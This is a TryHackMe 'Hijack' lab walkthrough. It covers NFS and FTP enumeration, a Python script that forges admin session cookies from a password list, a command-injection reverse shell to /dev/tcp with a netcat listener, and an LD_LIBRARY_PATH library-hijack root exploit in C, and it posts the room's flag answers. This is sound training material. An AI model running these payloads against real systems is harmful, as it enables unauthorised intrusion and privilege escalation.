# <div align="center">[Hijack - TryHackMe walkthrough](https://tryhackme.com/room/hijack?utm_source=chatgpt.com)</div>
<div align="center">Misconfigs conquered, identities claimed.</div>
<div align="center">
	<img width="200" height="200" alt="HIJACK" src="https://github.com/user-attachments/assets/951f63c4-eb12-4711-b60c-aabde3ecdbdc" />
</div>

## Task 1. Deploy the machine and get the flags!
### What is the user flag?
```
THM{fdc8cd4cff2c19e0d1022e78481ddf36}
```
### What is the root flag?
```
THM{b91ea3e8285157eaf173d88d0a73ed5a}
```

---
## Introduction

Hijack is a beginner-friendly [TryHackMe](https://tryhackme.com/dashboard) room focused on misconfigurations, session hijacking, command injection, and Linux privilege escalation. In this walkthrough, I’ll cover the complete path from initial enumeration to root access.

# Initial Enumeration

I started with an Nmap scan to identify the running services and get a better understanding of the target surface.

```bash
nmap -sV -sC 10.49.153.158
```

```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     2-4 (RPC #100003)
```

The scan revealed a few interesting services:

* FTP on port 21
* SSH on port 22
* HTTP on port 80
* RPCBind on port 111
* NFS on port 2049

The NFS service immediately caught my attention. Before digging into that, I checked whether the FTP server allowed anonymous authentication, but the login attempt failed.

I then used `showmount` to enumerate exported NFS shares.

```bash
showmount -e 10.49.153.158
```

```bash
Export list for 10.49.153.158:
/mnt/share *
```

The `/mnt/share` directory was exposed and accessible remotely, so I mounted it locally.

```bash
mkdir hijack_ctf
sudo mount -t nfs 10.49.153.158:/mnt/share/ hijack_ctf
```

```bash
death@esther:/opt/thm$ ls -la
total 12
drwxr-xr-x 3 death death 4096 May 25 21:28 .
drwxr-xr-x 6 root  root  4096 May 25 21:28 ..
drwx------ 2  1003  1003 4096 Aug  9  2023 hijack_ctf
```

The mounted directory was owned by UID and GID `1003`. Since NFS relies heavily on UID/GID mapping, I created a local user with the same identifiers to inherit the share permissions.

```bash
sudo useradd hijack
sudo usermod -u 1003 hijack
sudo groupmod -g 1003 hijack
sudo passwd hijack
```

After creating the user, I switched into it and accessed the mounted share.

```bash
su hijack
```

Inside the share, I found a text file containing FTP credentials.

```bash
$ ls
hijack_ctf

$ cd hijack_ctf

$ ls
for_employees.txt

$ cat for_employees.txt
ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4
```

# Credential Discovery

Using the credentials discovered from the NFS share, I logged into the FTP service.

```bash id="4jv7ep"
ftp 10.49.153.158
```

```bash id="9pnfho"
Connected to 10.49.153.158.
220 (vsFTPd 3.0.3)
Name (10.49.153.158:death): ftpuser
331 Please specify the password.
Password: W3stV1rg1n14M0un741nM4m4
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

After logging in successfully, I started enumerating the available files inside the FTP directory. A normal listing did not reveal anything interesting, so I switched to a detailed listing to check for hidden files.

```bash id="2t9x6m"
ftp> ls

229 Entering Extended Passive Mode (|||30802|)
150 Here comes the directory listing.
226 Directory send OK.
```

```bash id="1v6qfd"
ftp> ls -la

229 Entering Extended Passive Mode (|||35347|)
150 Here comes the directory listing.

drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 .
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08  2023 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile

226 Directory send OK.
```

Among the hidden files, `.passwords_list.txt` immediately caught my attention. I downloaded it locally for further inspection.

```bash id="31to3g"
ftp> get .passwords_list.txt
```

```bash id="6u0lb2"
local: .passwords_list.txt remote: .passwords_list.txt
229 Entering Extended Passive Mode (|||39466|)
150 Opening BINARY mode data connection for .passwords_list.txt (3150 bytes).

100% |***********************************|  3150       30.21 KiB/s    00:00 ETA

226 Transfer complete.
3150 bytes received in 00:00 (24.16 KiB/s)

ftp> exit
221 Goodbye.
```

The file contained multiple passwords, which looked potentially useful for further enumeration and authentication attempts.

<div align="center">
	<img width="401" height="199" alt="image" src="https://github.com/user-attachments/assets/fee27f94-abb8-49a9-996d-1285742e9a0c" />
</div>

## Web Enumeration

After collecting the FTP password list, I moved toward the web application running on port 80.

The homepage looked fairly simple at first glance.

<div align="center">
	<img width="717" height="201" alt="image" src="https://github.com/user-attachments/assets/eaa5bc0c-8b49-450d-ad2e-f6edc2b1f111" />
</div>

I created a normal account and logged into the application.

<div align="center">
	<img width="393" height="171" alt="image" src="https://github.com/user-attachments/assets/8028bf1d-957c-4b70-af1f-f0125ef2dc18" />
</div>

After authentication, the dashboard looked mostly the same, but this time an additional Admin tab appeared in the navigation bar. When I clicked on it, the application returned an access denied message.

<div align="center">
	<img width="696" height="121" alt="image" src="https://github.com/user-attachments/assets/f0fab9a3-b7ed-4899-ad03-e0dacb1e245a" />
</div>

That immediately made me curious about how the application handled authorization. I opened Burp Suite and intercepted the request while accessing the admin panel.

<div align="center">
	<img width="828" height="801" alt="image" src="https://github.com/user-attachments/assets/0e169787-61a0-464e-8810-31801ddc4018" />
</div>

While reviewing the captured request, the session cookie looked unusual.
```
Cookie: PHPSESSID=VGVzdDowZTc1MTcxNDFmYjUzZjIxZWU0MzliMzU1YjVhMWQwYQ%3D%3D
```

The structure looked encoded rather than randomly generated, so I copied the value into [CyberChef](https://cyberchef.org) for analysis.

<div align="center">
	<img width="1127" height="610" alt="image" src="https://github.com/user-attachments/assets/eb8a823f-e53b-431e-b7e9-2697aab659f5" />
</div>

After decoding it, the format looked like:
```
username:hash
```
The hash portion also looked familiar, so I identified it separately.

The hash turned out to be MD5.

<img width="880" height="490" alt="image" src="https://github.com/user-attachments/assets/f02e6d47-7f34-43db-a6e7-5fa9f22370d1" />

At this point, the session format became clear:
```
base64(username:md5(password))
```
Since I already had a password list from the FTP server, I suspected the admin account might also be using one of those passwords. If I could generate a valid session manually, it might be possible to hijack the admin session without needing to brute force the login form directly.

I initially tried testing requests manually, but the application quickly started rate limiting the attempts.
<img width="1010" height="264" alt="image" src="https://github.com/user-attachments/assets/00e97215-77ad-4b06-9779-8728cd099970" />



To avoid interacting with the login form repeatedly, I created a Python script that generated valid session cookies using passwords from the discovered wordlist.
```c
import hashlib
import base64
import requests
import os

target_ip = input("[+] Enter Target IP: ").strip()
wordlist = input("[+] Enter Wordlist Path: ").strip()

url = f"http://{target_ip}/administration.php"

if not os.path.exists(wordlist):
    print("[-] Wordlist not found")
    exit()

with open(wordlist, "r") as f:
    passwords = [line.strip() for line in f]

session = requests.Session()

print(f"\n[+] Loaded {len(passwords)} passwords")
print(f"[+] Target: {url}\n")

for password in passwords:

    md5_hash = hashlib.md5(password.encode()).hexdigest()

    session_data = f"admin:{md5_hash}"

    encoded_cookie = base64.b64encode(session_data.encode()).decode()

    headers = {
        "Cookie": f"PHPSESSID={encoded_cookie}"
    }

    try:
        response = session.get(url, headers=headers, timeout=5)

        print(f"[*] Trying: {password}")

        if "Access denied" not in response.text:

            print("\n[+] Valid Session Found")
            print(f"[+] Password : {password}")
            print(f"[+] Cookie   : PHPSESSID={encoded_cookie}")

            break

    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
```
I saved the script locally.
```
nano bruteforce.py
```
Then I executed it against the target.
```
python3 bruteforce.py
[+] Enter Target IP: 10.49.153.158
[+] Enter Wordlist Path: .passwords_list.txt

[+] Loaded 150 passwords
[+] Target: http://10.49.153.158/administration.php
```
The script started generating session cookies using each password from the wordlist and tested them directly against the admin endpoint.

After a few attempts, a valid session was finally discovered.

```
[+] Valid Session Found
[+] Password : uDh3jCQsdcuLhjVkAy5x
[+] Cookie   : PHPSESSID=YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=
```
Using the generated cookie, I was able to access the admin panel successfully.

<div align="center">
	<img width="784" height="179" alt="image" src="https://github.com/user-attachments/assets/10aa672c-458d-4b26-bd5e-b608b02bb804" />
</div>

## Initial Access

With the valid admin session cookie generated earlier, I went back to the application and intercepted the request to the administration panel using Burp Suite.

<div align="center">
	<img width="754" height="784" alt="image" src="https://github.com/user-attachments/assets/9ca1eb76-451c-4ad1-8597-3635fd333d49" />
</div>

I replaced the existing PHPSESSID value with the newly generated admin cookie.

<div align="center">
	<img width="1429" height="451" alt="image" src="https://github.com/user-attachments/assets/da352ba1-08ec-4e1a-9f0f-d3a0e79df363" />
</div>

After forwarding the modified request, the admin panel loaded successfully.

The page turned out to be an online service status checker. It accepted a service name as input and returned the current status of the requested service.

To understand how the feature behaved, I tested it using `ssh`.

<div align="center">
	<img width="1191" height="498" alt="image" src="https://github.com/user-attachments/assets/0fae9e75-f86e-44fb-aae8-1aea510089d1" />
</div>

The application returned the service status correctly. While testing the functionality, I noticed that every request required the admin session cookie, so I kept replacing the cookie value inside Burp before forwarding requests.

After spending some time interacting with the feature, I realized the input might be vulnerable to command injection. The backend appeared to execute shell commands directly using the provided service name.

I tested command chaining using the && operator and attempted to execute a reverse shell.

The application returned the service status correctly. While testing the functionality, I noticed that every request required the admin session cookie, so I kept replacing the cookie value inside Burp before forwarding requests.

After spending some time interacting with the feature, I realized the input might be vulnerable to command injection. The backend appeared to execute shell commands directly using the provided service name.

I tested command chaining using the && operator and attempted to execute a reverse shell.
```
ssh && bash -c "bash -i >& /dev/tcp/<IP>/1234 0>&1"
```
Before sending the payload, I started a Netcat listener on my local machine.
```
nc -lnvp 1234
```
I replaced `<IP>` with my VPN IP address and submitted the payload through the service checker.

<div align="center">
	<img width="1275" height="510" alt="image" src="https://github.com/user-attachments/assets/ce00c706-8a2c-4d56-b0fe-06ebc58913a2" />
</div>

A few seconds later, the reverse shell connected back successfully.

A few seconds later, the reverse shell connected back successfully.

```
Listening on 0.0.0.0 1234
Connection received on 10.49.153.158 47886

bash: cannot set terminal process group (1244): Inappropriate ioctl for device
bash: no job control in this shell

www-data@Hijack:/var/www/html$
```
Now operating as `www-data`, I started enumerating the web directory.
```
ls
```
```
administration.php
config.php
index.php
login.php
logout.php
navbar.php
service_status.sh
signup.php
style.css
```
The config.php file looked interesting, so I inspected it for credentials.


Inside the file, I found database credentials stored in plaintext.
```
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";
```

<div align="center">
	<img width="733" height="372" alt="image" src="https://github.com/user-attachments/assets/3a148004-9146-44cc-a543-58ee05b61367" />
</div>

# Lateral Movement

After finding the credentials inside `config.php`, I decided to test whether the same credentials were reused for SSH access.

```bash id="r4n8tp"
ssh rick@10.49.153.158
```

```text id="m2v7ka"
password: N3v3rG0nn4G1v3Y0uUp
```

The credentials worked successfully, and I gained an interactive shell as the `rick` user.

```bash id="u5q1zs"
$ ls
```

```text id="c8n6fd"
user.txt
```

I immediately checked the user flag.

```bash id="x7v3oq"
cat user.txt
```

```text id="n9t4wb"
THM{fdc8cd4cff2c19e0d1022e78481ddf36}
```

# Privilege Escalation Enumeration

After getting access as the `rick` user, I started checking for possible privilege escalation vectors.

The first thing I checked was the user's sudo permissions.

```bash id="d2k9qa"
sudo -l
```

```text id="m7v1cf"
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

The interesting part here was the `env_keep+=LD_LIBRARY_PATH` setting.

Since the `LD_LIBRARY_PATH` environment variable was preserved during sudo execution, it opened the door for shared library hijacking. The idea was to force the target binary to load a malicious shared library from a custom path before loading the legitimate one.

To understand which shared libraries the Apache binary used, I checked them using `ldd`.

```bash id="x5n8re"
ldd /usr/sbin/apache2
```

```text id="z3t0wl"
linux-vdso.so.1 =>  (0x00007fff5ab16000)
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3
libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0
libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1
```

I decided to target `libcrypt.so.1`.

The plan was to create a malicious shared object with the same name and place it inside `/tmp`. Then, by setting `LD_LIBRARY_PATH=/tmp`, Apache would load my malicious library first.

I created the following C file.

```bash id="f1u7nc"
nano library_path.c
```

```c id="q8v4ke"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setreuid(0,0);
        system("/bin/bash -p");
}
```

Next, I compiled it as a shared library named `libcrypt.so.1`.

```bash id="w6p2sj"
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/rick/library_path.c
```

Once the malicious library was ready, I executed Apache with the modified `LD_LIBRARY_PATH`.

```bash id="y9m5ta"
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

The exploit worked successfully and spawned a root shell.

<div align="center">
	<img width="1303" height="164" alt="image" src="https://github.com/user-attachments/assets/efb9896e-09d1-4750-98e2-5e58616472ce" />
</div>

# Root Access

Now operating as root, I captured the final flag.

```bash id="u4r8xp"
cat /root/root.txt
```

```text id="c2k6nm"
██╗░░██╗██╗░░░░░██╗░█████╗░░█████╗░██╗░░██╗
██║░░██║██║░░░░░██║██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░░░██║███████║██║░░╚═╝█████═╝░
██╔══██║██║██╗░░██║██╔══██║██║░░██╗██╔═██╗░
██║░░██║██║╚█████╔╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

THM{b91ea3e8285157eaf173d88d0a73ed5a}
```

# Conclusion

Hijack was a fun machine focused on misconfigurations, session hijacking, command injection, and privilege escalation through `LD_LIBRARY_PATH` abuse. Every step connected nicely and made the enumeration process feel realistic and practical.

<div align="center">
	<img width="829" height="385" alt="image" src="https://github.com/user-attachments/assets/b3fb5c0e-6f42-43f6-ba47-8aa01b3cdad4" />
</div>

Thanks for reading this walkthrough. I hope it helped you understand the room better.

More walkthroughs:

* [Death Esther Medium](https://deathesther.medium.com?utm_source=chatgpt.com)
* [TryHackMe Walkthrough Repository](https://github.com/Esther7171/TryHackMe-Walkthroughs?utm_source=chatgpt.com)
